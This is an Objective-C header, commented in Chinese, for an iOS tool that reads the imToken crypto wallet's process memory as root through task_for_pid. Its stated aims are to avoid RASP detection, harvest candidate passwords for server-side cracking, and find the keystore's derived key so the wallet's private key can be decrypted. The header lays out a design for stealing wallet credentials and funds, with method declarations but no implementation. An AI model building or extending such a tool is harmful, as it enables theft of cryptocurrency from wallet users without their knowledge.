//
//  MemScan.h — 从别的进程内存里捞候选密码
//
//  前提（已实测）：locationd 里 uid=0，task_for_pid 30/30 成功。
//  所以不需要注入、不需要 hook、不会触发 RASP —— 直接读 imToken 的堆。
//
//  设计：设备只负责「捞候选字符串」，密码校验放到服务端
//  （pbkdf2 c=262144 在手机上太慢，服务端每条几十毫秒）。
//
#import <Foundation/Foundation.h>

@interface MemScan : NSObject

/// hex 字符串 → NSData
+ (NSData *)dataFromHex:(NSString *)hex;

/// 按可执行路径找进程 pid（比如 imToken 的 .../imToken.app/imToken）
+ (pid_t)pidOfExecutableContaining:(NSString *)needle;

/// 诊断用：列出可执行路径里含 needle 的进程，返回 @"pid:path" 字符串数组
+ (NSArray<NSString *> *)processPathsMatching:(NSString *)needle limit:(NSUInteger)limit;

/// 列出目标进程的可读写内存区，返回 @{ @"regions": N, @"bytes": @(总计) }
+ (NSDictionary *)regionSummaryForPid:(pid_t)pid;

/**
 * 扫描目标进程可写内存，捞出所有「可打印 ASCII 串」
 * @param maxBytes   最多扫多少字节（防止扫太久）
 * @param maxCands   最多返回多少条候选
 * @return @{ @"candidates": @[NSString], @"scannedBytes": @(N), @"regions": N, @"error": ... }
 */
+ (NSDictionary *)harvestStringsFromPid:(pid_t)pid
                               maxBytes:(NSUInteger)maxBytes
                              maxCands:(NSUInteger)maxCands;

/**
 * 在目标进程内存里找 keystore 的「派生密钥」（32 字节）。
 *
 * keystore v3 的校验关系：
 *     mac = keccak256( derivedKey[16:32] || ciphertext )
 * 所以滑动 32 字节窗口，一次 keccak（微秒级）就能判定，**不需要跑 pbkdf2**。
 * 找到后直接用 key[0:16] + iv 做 AES-128-CTR 解密即可。
 *
 * @param saltAscii  salt 的 hex 字符串（用来优先扫描「装着加密参数」的区域）
 * @return @{ @"found": @YES, @"key": NSData, @"scannedBytes": @(N), @"regions": N }
 */
+ (NSDictionary *)findDerivedKeyInPid:(pid_t)pid
                               cipher:(NSData *)cipher
                                  mac:(NSData *)mac
                            saltAscii:(NSString *)saltAscii
                             maxBytes:(NSUInteger)maxBytes;

@end
